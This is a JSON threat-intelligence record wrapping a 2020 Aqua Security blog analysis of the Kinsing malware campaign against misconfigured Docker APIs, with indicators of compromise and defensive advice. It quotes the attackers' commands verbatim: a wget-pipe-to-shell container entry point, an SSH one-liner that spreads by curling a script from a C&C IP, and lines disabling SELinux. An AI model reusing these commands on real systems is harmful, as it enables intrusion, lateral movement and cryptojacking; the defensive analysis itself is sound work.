@@ -1,0 +1,74 @@
+{
+    "id": "470b03da-aab7-44d6-bd46-db202ed5d5b4",
+    "created_at": "2023-01-12T14:59:53.300854Z",
+    "updated_at": "2025-03-27T02:17:01.080486Z",
+    "deleted_at": null,
+    "sha1_hash": "ac19a28a330a89059e1e48bc2ec6f768c0ac1723",
+    "title": "2020-04-03 - Kinsing Malware Attacks Targeting Container Environments",
+    "authors": "",
+    "file_creation_date": "2022-05-28T19:33:27Z",
+    "file_modification_date": "2022-05-28T19:33:27Z",
+    "file_size": 1223824,
+    "plain_text": "# Threat Alert: Kinsing Malware Attacks Targeting Container Environments\n\n**[blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability](https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability)**\n\nGal Singer\n\nGal Singer\n\nApril 03, 2020\n\n\n-----\n\nLately we ve been witnessing a rise in the number of attacks that target container\nenvironments. We’ve been tracking an organized attack campaign that targets misconfigured\nopen Docker Daemon API ports. This persistent campaign has been going on for months,\nwith thousands of attempts taking place nearly on a daily basis. These are the highest\nnumbers we’ve seen in some time, far exceeding what we have witnessed to date. We\ntherefore believe that these attacks are directed by actors with sufficient resources and the\ninfrastructure needed to carry out and sustain such attacks, and that this is not an improvised\nendeavor.\n\nThe following graph shows the volume of attacks by day:\n\nIn this attack, the attackers exploit a misconfigured Docker API port to run an Ubuntu\ncontainer with the kinsing malicious malware, which in turn runs a cryptominer and then\nattempts to spread the malware to other containers and hosts. Our analysis of this attack\nvector exposes the techniques used, starting with exploiting the open port, through evasion\ntactics and lateral movement, all the way up to the end-goal of deploying the cryptominer.\n\n## How the Attack is Initiated\n\nTaking advantage of the unprotected open Docker API port, the attackers are able to\ninstantiate an Ubuntu container with the following entry point:\n\n/bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O 142.44.191.122/d.sh | sh;tail -f /dev/null\n\nWe saw this entry point in every attack in this campaign, with the only change being the IP\naddress that d.sh is downloaded from. We witnessed 3 IP addresses used in total--the one in\nthe example above, 217.12.221.244 and 185.92.74.42\n\nThe command does the following:\n\nUpdate packages with apt-get update\nInstall wget with apt-get\nStart the cron service.\n\n\n-----\n\nDownload a shell script with the just installed wget\nRun the shell script and read indefinitely from /dev/null to keep the container alive and\nrunning\n\nWe can see that the wget program was required to download the cron shell script. The script\nwould be later used in order to gain persistency within the container.\n\n## Defense Evasion and Persistence\n\nThe shell script d.sh, referred to from hereon as 'the shell script’, contains more than 600\nlines. We discovered that the shell script does the following:\n\n1. Disables security measures and clears logs: echo SELINUX=disabled\n\n>/etc/selinux/config\n2. Kills numerous applications, notably other malwares and cryptominers.\n3. Deletes files related to other malwares/cryptominers, most of them from the /tmp\n\ndirectory\n4. Kills running rival malicious Docker containers and deletes their image.\n5. Downloads the ‘kinsing’ malware and runs it\n6. Uses crontab to download and run the shell script every minute\n7. Looks for other commands running in cron, and if ones were identified, deletes all cron\n\njobs, including its own. We are not certain why the attackers chose to do so, but that is\nwhat the script executes:\n\ncrontab -l | sed '/update.sh/d' | crontab \n## Running the Malware\n\n**Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis. From**\nhere on we’ll refer to the malware as kinsing.\n\n\n-----\n\nA quick look at the malware s strings reveals that it is a Golang-based Linux agent. It uses\nseveral Go libraries, including:\n\n**go-resty – an HTTP and REST client library, used to communicate with a Command**\nand Control (C&C) server.\n**gopsutil – a process utility library, used for system and processes monitoring.**\n**osext – extension to the standard ‘os’ package, used to execute binaries.**\n**diskv - A disk-backed key-value store, for storage.**\n\nRunning the malware in a controlled environment and monitoring it brought up more details\nabout its malicious actions.\n\n## Communication with C&C servers\n\nBefore the malware proceeded to deploy its payload, it attempted to communicate with\nservers in Eastern Europe. It appears that there are dedicated servers for each function that\nthe malware executes:\n\n1. Attempts to establish a connection with the following IP address: 45.10.88.102. The\n\nattempts fail as the server does not respond.\n2. Connects to 91.215.169.111, which appears to be the main C&C server. The malware\n\ncommunicates with that host over HTTP port 80, and sends small encrypted messages\non regular intervals, every few seconds.\n3. Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will\n\nsee in the next paragraph, to download a shell script used for lateral movement\npurposes.\n4. Connects to 193.33.87.219 to download the cryptominer C&C communication.\n\n## Discovery and Lateral Movement\n\nThe spre.sh shell script that the malware downloads is used to laterally spread the malware\nacross the container network.\n\nIn order to discover potential targets and locate the information it needs to authenticate\nagainst, the script passively collects data from /.ssh/config, .bash_history,\n/.ssh/known_hosts, and the likes. We did not identify any active scanning techniques used to\nidentify additional targets.\n\nUsing the information gathered, the malware then attempts to connect to each host, using\nevery possible user and key combination through SSH, in order to download the\naforementioned shell script and run the malware on other hosts or containers in the network.\n\nThe actual shell script is named spr.sh this time around, but it is identical to the a d.sh shell\nscript used earlier in the attack sequence\n\n\n-----\n\nThe following SSH command was used to spread it throughout the network:\n\nssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key\n$user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O http://217.12.221.244/spr.sh|sh;\"\n\nWe noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection\nattempts, and their cleanup, possibly indicating that the attackers have some sense of\nevasion and were trying to hide their activities.\n\n_Spre.sh script_\n\nAt the last stage of the attack the malware runs a cryptominer called kdevtmpfsi. The\ncryptominer was identified by Virus Total as a Bitcoin miner.\n\n\n-----\n\nThe cryptominer connects to a host with the 193.33.87.219 IP address using a log in request\nover HTTP, receives further instructions, and starts mining cryptocurrency.\n\nThe infographic below illustrates the full flow of the attack:\n\n## Summary\n\n\n-----\n\nThis attack stands out as yet another example of the growing threat to cloud native\nenvironments. With deployments becoming larger and container use on the rise, attackers\nare upping their game and mounting more ambitious attacks, with an increasing level of\nsophistication.\n\nHere is a summary of the attack components, mapping each component of the attack to the\n[corresponding MITREAtt&ck tactics and techniques category:](https://attack.mitre.org/)\n\nWe believe that DevSecOps teams must also up their game and become aware of the\nthreats that are lurking in the cloud, and develop a security strategy to mitigate risks. Here’s\na list of steps we’d consider making:\n\n1. Identify all cloud resources and group them by some logical structure.\n2. Review authorization and authentication policies, basic security policies, and adjust\n\nthem according to the principle of least privilege.\n3. Scan the images that you use, making sure you are familiar with them and their use,\n\nusing minimal privileges such as avoiding root user and privileged mode. Use Trivy the\nOpen Source vulnerability scanner.\n4. Investigate logs, mostly around user actions, look for actions you can’t account for\n\nanomalies.\n[5. Form a security strategy where you can enforce your policies with ease, consider using](https://blog.aquasec.com/cloud-native-security-drift-prevention)\n\n[cloud security tools that will widen your scope and reach within your cloud resources.](https://www.aquasec.com/products/aqua-cloud-native-security-platform/)\n\n\n-----\n\n**We encourage you to block access to the following IOC’s-URL’s:**\n\nhttp://142.44.191.122/d.sh\nhttp://142.44.191.122/kinsing/\nhttp://142.44.191.122/al.sh\nhttp://142.44.191.122/cron.sh\nhttp://142.44.191.122/\nhttp://142.44.191.122/kinsing\nhttp://142.44.191.122/ex.sh\nhttp://185.92.74.42/w.sh\nhttp://185.92.74.42/d.sh\nhttp://217.12.221.244/\nhttp://217.12.221.24/d.sh\nhttp://217.12.221.244/kinsing\nhttp://217.12.221.244/j.sh\nhttp://217.12.221.244/t.sh\nhttp://217.12.221.244/spr.sh\nhttp://217.12.221.244/spre.sh\nhttp://217.12.221.244/p.sh\nhttp://217.12.221.244/Application.jar\nhttp://217.12.221.244/f.sh\nhttp://www.traffclick.ru/\nhttp://www.mechta-dachnika-tut.ru/\nhttp://www.rus-wintrillions-com.ru/\nhttp://rus-wintrillions-com.ru/\nhttp://stroitelnye-jekologicheskie-materialy2016.ru\n45.10.88.102\n91.215.169.111\n193.33.87.219\n\nMD5s:\nkinsing - 0d3b26a8c65cf25356399cc5936a7210\nkinsing - 6bffa50350be7234071814181277ae79\nkinsing - c4be7a3abc9f180d997dbb93937926ad\nkdevtmpfsi - d9011709dd3da2649ed30bf2be52b99e\n\n\n-----\n\n**Gal Singer**\n\nGal is a Security Researcher at Aqua. As part of the Aqua research team, his work focuses\non researching vulnerabilities in Kubernetes and Networking around the cloud native world.\nWhen not at work, he likes going to music concerts and spending time at the beach with his\nfriends.\n\n[Security Threats,](https://blog.aquasec.com/topic/security-threats) [Container Vulnerability,](https://blog.aquasec.com/topic/container-vulnerability) [Cloud Native Security,](https://blog.aquasec.com/topic/cloud-native-security) [Malware Attacks](https://blog.aquasec.com/topic/malware-attacks)\n\n[Tweet](https://twitter.com/share)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-03 - Kinsing Malware Attacks Targeting Container Environments.pdf"
+    ],
+    "report_names": [
+        "2020-04-03 - Kinsing Malware Attacks Targeting Container Environments.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
+            "created_at": "2023-01-06T13:46:39.390649Z",
+            "updated_at": "2025-03-27T02:00:03.072899Z",
+            "deleted_at": null,
+            "main_name": "Kinsing",
+            "aliases": [
+                "Money Libra"
+            ],
+            "source_name": "MISPGALAXY:Kinsing",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535593,
+    "ts_updated_at": 1743041821,
+    "ts_creation_date": 1653766407,
+    "ts_modification_date": 1653766407,
+    "files": {
+        "pdf": "https://archive.orkl.eu/ac19a28a330a89059e1e48bc2ec6f768c0ac1723.pdf",
+        "text": "https://archive.orkl.eu/ac19a28a330a89059e1e48bc2ec6f768c0ac1723.txt",
+        "img": "https://archive.orkl.eu/ac19a28a330a89059e1e48bc2ec6f768c0ac1723.jpg"
+    }
+}
